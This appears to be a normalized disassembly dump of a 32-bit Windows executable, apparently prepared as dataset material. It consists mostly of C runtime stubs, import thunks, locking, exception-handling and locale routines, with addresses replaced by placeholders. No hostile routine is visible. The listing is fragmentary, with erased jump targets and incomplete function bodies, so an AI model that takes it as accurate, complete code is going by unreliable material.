push [ ebp + 0x8 ]
push [ rwxdata ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_4123ca
mov eax [ rwxdata ]
retn
sub_412404
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rwxdata ]
call [ DecodePointer@IAT ]
call eax
pop ebp
retn 0x8
sub_412500
push 0xd
call sub_40f319
pop ecx
retn
sub_412509
push 0xc
call sub_40f319
pop ecx
retn
sub_4126bf
push 0xd
call sub_40f319
pop ecx
retn
sub_4126cb
push 0xc
call sub_40f319
pop ecx
retn
GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
GetCurrentThread
jmp [ GetCurrentThread@IAT ]
sub_4129e6
call sub_40cbaf
retn
sub_4129ec
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4129b0
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_412b9b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_412c0e
push sub_412bcc
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_412ee7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_41327d
and [ rwxdata ] 0x0
retn
sub_413686
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_4137fa
push [ ebp + 0x8 ]
call sub_417bc6
pop ecx
retn
sub_413b61
push 0xd
call sub_40f319
pop ecx
retn
sub_413f6e
push 0xd
call sub_40f319
pop ecx
retn
sub_413fa7
cmp [ rwxdata ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_413e0d
pop ecx
mov [ rwxdata ] 0x1
sub_4142f2
push 0xc
call sub_40f319
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_41452b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_4144f3
pop ecx
pop ecx
pop ebp
retn
sub_41453e
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_414554
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_41456a
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_41457d
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_414590
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_4145a3
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_4145b6
mov edi edi
push ebp
mov ebp esp
push 0x4
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_4145c9
mov edi edi
push ebp
mov ebp esp
push 0x4
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_4145dc
mov edi edi
push ebp
mov ebp esp
push 0x80
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_4145f2
mov edi edi
push ebp
mov ebp esp
push 0x80
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_414608
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_41461b
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_41462e
mov edi edi
push ebp
mov ebp esp
push 0x10
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_414641
mov edi edi
push ebp
mov ebp esp
push 0x10
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_414654
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_41466a
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_414680
mov edi edi
push ebp
mov ebp esp
push 0x157
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_414696
mov edi edi
push ebp
mov ebp esp
push 0x157
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_4146ac
mov edi edi
push ebp
mov ebp esp
push 0x117
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_4146c2
mov edi edi
push ebp
mov ebp esp
push 0x117
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_4146d8
mov edi edi
push ebp
mov ebp esp
push 0x20
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_4146eb
mov edi edi
push ebp
mov ebp esp
push 0x20
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_4146fe
mov edi edi
push ebp
mov ebp esp
mov eax 0x80
cmp [ ebp + 0x8 ] ax
sbb eax eax
neg eax
pop ebp
retn
sub_414a16
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
pop ebp
retn
sub_416bfb
push ebx
call sub_417bc6
pop ecx
retn
sub_4176ff
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4174fb
add esp 0x10
pop ebp
retn
sub_417865
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417719
add esp 0x10
pop ebp
retn
sub_417969
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_4178a0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_4179b4
call eax
retn
sub_417bbd
push 0xa
call sub_40f319
pop ecx
retn
sub_417cbf
push 0xa
call sub_40f319
pop ecx
retn
sub_417d7d
push 0xb
call sub_40f319
pop ecx
retn
sub_417fd5
push 0x3
call sub_40f319
pop ecx
retn
sub_4180f4
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417fde
add esp 0x10
pop ebp
retn
sub_418225
mov eax [ rwxdata ]
retn
sub_41822b
mov eax rwxdata
retn
sub_4182b5
mov eax [ rwxdata ]
mov ecx [ eax + 0xbc ]
mov [ rwxdata ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rwxdata ] ecx
mov eax [ eax + 0xac ]
mov [ rwxdata ] eax
retn
sub_41838b
push 0xd
call sub_40f319
pop ecx
retn
sub_418397
push 0xc
call sub_40f319
pop ecx
retn
sub_4183a0
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4182de
sub_418445
push 0xc
call sub_40f319
pop ecx
retn
sub_418451
push 0xd
call sub_40f319
pop ecx
retn
j_sub_4183ab
jmp sub_4183ab
sub_41845f
xor eax eax
retn
sub_418ffe
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_418f09
sub_41913b
push 0xc
call sub_40f319
pop ecx
retn
sub_419147
push 0xc
call sub_40f319
pop ecx
retn
sub_419150
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419178
mov eax [ ebp - 0x20 ]
call sub_40f555
retn
sub_419178
and [ esi + 0x70 ] 0xffffffef
retn
sub_4192bd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
add eax 0x8
sub_41943a
push 0x2
call sub_40cead
sub_419496
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_419443
add esp 0x10
pop ebp
retn
sub_4194af
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_419443
add esp 0x10
pop ebp
retn
sub_4194c7
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_419443
add esp 0x10
pop ebp
retn
sub_4194e0
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_419443
add esp 0x10
pop ebp
retn
sub_4194f8
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_419443
add esp 0x10
pop ebp
retn
sub_419511
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_419443
add esp 0x10
pop ebp
retn
sub_419529
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_419443
add esp 0x10
pop ebp
retn
sub_419545
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push 0x0
call sub_419443
add esp 0x10
pop ebp
retn
sub_419560
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_419443
add esp 0x10
pop ebp
retn
sub_41957c
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push 0x0
call sub_419443
add esp 0x10
pop ebp
retn
sub_419597
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_419443
add esp 0x10
pop ebp
retn
sub_4195b3
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push 0x0
call sub_419443
add esp 0x10
pop ebp
retn
sub_4195ce
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_419443
add esp 0x10
pop ebp
retn
sub_4195ea
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push 0x0
call sub_419443
add esp 0x10
pop ebp
retn
sub_419605
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_419443
add esp 0x10
pop ebp
retn
sub_41961e
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push 0x0
call sub_419443
add esp 0x10
pop ebp
retn
sub_419636
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_419443
add esp 0x10
pop ebp
retn
sub_41964f
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_419443
add esp 0x10
pop ebp
retn
sub_419667
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_419443
add esp 0x10
pop ebp
retn
sub_419680
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_419443
add esp 0x10
pop ebp
retn
sub_4196ed
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_419698
pop ecx
pop ecx
pop ebp
retn
sub_41addb
call sub_41258b
mov ecx [ eax + 0x6c ]
cmp ecx [ rwxdata ]
je r-xdata
mov eax [ rwxdata ]
retn
mov ecx [ rwxdata ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_414285
sub_41ae01
mov eax [ rwxdata ]
retn
sub_41ae07
call sub_41258b
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_414285
sub_41b1d7
call sub_41258b
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_414285
sub_41b200
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_41b1d7
sub_41b21c
call sub_41258b
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_414285
sub_41b242
call sub_41258b
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ eax + 0x8 ]
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_414285
sub_41b268
call sub_41258b
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
add eax 0xc
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_414285
sub_41b2e3
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41b28e
sub_41b2ee
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41b28e
pop ecx
pop ecx
pop ebp
retn
sub_41b597
push ebx
call sub_417bc6
pop ecx
retn
sub_41b6fc
push ebx
call sub_417bc6
pop ecx
retn
sub_41b911
push ebx
call sub_417bc6
pop ecx
retn
sub_41bb0e
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rwxdata ] eax
retn
sub_41bb2d
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_41bb44
xor eax eax
retn
sub_41bcfa
or [ esi + 0x8 ] 0x104
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x1c ] eax
mov [ esi + 0x18 ] eax
retn
sub_41c456
test eax eax
je r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
sub_41c466
movzx eax [ eax ]
movzx ecx [ ecx ]
sub eax ecx
je r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
sub_41ef10
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_418110
sub_41ef26
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_418110
sub_41ef3c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x20
pop ebp
retn
sub_41f33c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_41f231
pop ebp
retn
GetLastError
jmp [ GetLastError@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
GetSystemTimeAsFileTime
jmp [ GetSystemTimeAsFileTime@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
GetModuleHandleW
jmp [ GetModuleHandleW@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
DecodePointer
jmp [ DecodePointer@IAT ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
HeapSetInformation
jmp [ HeapSetInformation@IAT ]
GetStartupInfoW
jmp [ GetStartupInfoW@IAT ]
TerminateProcess
jmp [ TerminateProcess@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
UnhandledExceptionFilter
jmp [ UnhandledExceptionFilter@IAT ]
SetUnhandledExceptionFilter
jmp [ SetUnhandledExceptionFilter@IAT ]
IsDebuggerPresent
jmp [ IsDebuggerPresent@IAT ]
HeapCreate
jmp [ HeapCreate@IAT ]
HeapDestroy
jmp [ HeapDestroy@IAT ]
WriteFile
jmp [ WriteFile@IAT ]
GetStdHandle
jmp [ GetStdHandle@IAT ]
GetModuleFileNameW
jmp [ GetModuleFileNameW@IAT ]
EncodePointer
jmp [ EncodePointer@IAT ]
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
SetHandleCount
jmp [ SetHandleCount@IAT ]
InitializeCriticalSectionAndSpinCount
jmp [ InitializeCriticalSectionAndSpinCount@IAT ]
GetFileType
jmp [ GetFileType@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
Sleep
jmp [ Sleep@IAT ]
FatalAppExitA
jmp [ FatalAppExitA@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
GetConsoleCP
jmp [ GetConsoleCP@IAT ]
GetConsoleMode
jmp [ GetConsoleMode@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
SetConsoleCtrlHandler
jmp [ SetConsoleCtrlHandler@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
LoadLibraryW
jmp [ LoadLibraryW@IAT ]
GetLocaleInfoW
jmp [ GetLocaleInfoW@IAT ]
TlsAlloc
jmp [ TlsAlloc@IAT ]
TlsGetValue
jmp [ TlsGetValue@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
TlsFree
jmp [ TlsFree@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
SetLastError
jmp [ SetLastError@IAT ]
__imp_GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
__imp_GetCurrentThread
jmp [ GetCurrentThread@IAT ]
GetModuleFileNameA
jmp [ GetModuleFileNameA@IAT ]
FreeEnvironmentStringsW
jmp [ FreeEnvironmentStringsW@IAT ]
GetEnvironmentStringsW
jmp [ GetEnvironmentStringsW@IAT ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
GetTickCount
jmp [ GetTickCount@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetOEMCP
jmp [ GetOEMCP@IAT ]
IsValidCodePage
jmp [ IsValidCodePage@IAT ]
HeapReAlloc
jmp [ HeapReAlloc@IAT ]
FlushFileBuffers
jmp [ FlushFileBuffers@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
SetStdHandle
jmp [ SetStdHandle@IAT ]
WriteConsoleW
jmp [ WriteConsoleW@IAT ]
HeapSize
jmp [ HeapSize@IAT ]
LCMapStringW
jmp [ LCMapStringW@IAT ]
GetStringTypeW
jmp [ GetStringTypeW@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
GetProcessHeap
jmp [ GetProcessHeap@IAT ]
CreateFileW
jmp [ CreateFileW@IAT ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
EnumSystemLocalesA
jmp [ EnumSystemLocalesA@IAT ]
IsValidLocale
jmp [ IsValidLocale@IAT ]
sub_41f66a
mov eax sub_42020a
mov [ rwxdata ] eax
mov [ rwxdata ] sub_41f8a3
mov [ rwxdata ] sub_41f857
mov [ rwxdata ] sub_41f890
mov [ rwxdata ] sub_41f7f9
mov [ rwxdata ] eax
mov [ rwxdata ] sub_420182
mov [ rwxdata ] sub_41f815
mov [ rwxdata ] sub_41f777
mov [ rwxdata ] sub_41f703
retn
sub_41f6ca
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ rwxdata ]
mov [ rwxdata ] ecx
pop ebp
retn
sub_41f6df
mov edi edi
push ebp
mov ebp esp
call sub_41f66a
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_42022d
sub_41f6f8
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_420260
sub_41f857
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f815
add esp 0x10
pop ebp
retn
sub_41f890
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41f703
pop ecx
pop ecx
pop ebp
retn
sub_41f8a3
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41f777
pop ecx
pop ecx
pop ebp
retn
sub_420058
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ff97
add esp 0x14
pop ebp
retn
sub_420825
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x80
sbb eax eax
neg eax
pop ebp
retn
sub_420837
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
and eax 0x7f
pop ebp
retn
sub_420972
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4208ca
add esp 0xc
pop ebp
retn
sub_420a32
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420989
add esp 0xc
pop ebp
retn
sub_420af1
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420a49
add esp 0xc
pop ebp
retn
sub_420b3a
mov eax [ rwxdata ]
retn
sub_421083
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
pop ebp
retn
sub_423bfe
push 0x1f80
call sub_424bec
pop ecx
retn
sub_424b2a
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_424b3a
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
leave
retn
sub_424bce
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rwxdata ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
stmxcsr [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
sub_424c19
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_424c5e
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rwxdata ] 0x0
je r-xdata
leave
retn
stmxcsr [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0xffffffc0
ldmxcsr [ ebp - 0x4 ]
sub_424c7b
xor eax eax
cmp [ rwxdata ] eax
je r-xdata
retn
call sub_424bce
and eax 0x3f
sub_424c8e
xor eax eax
cmp [ rwxdata ] eax
je r-xdata
retn
call sub_424bce
and eax 0x3f
jmp sub_424c5e
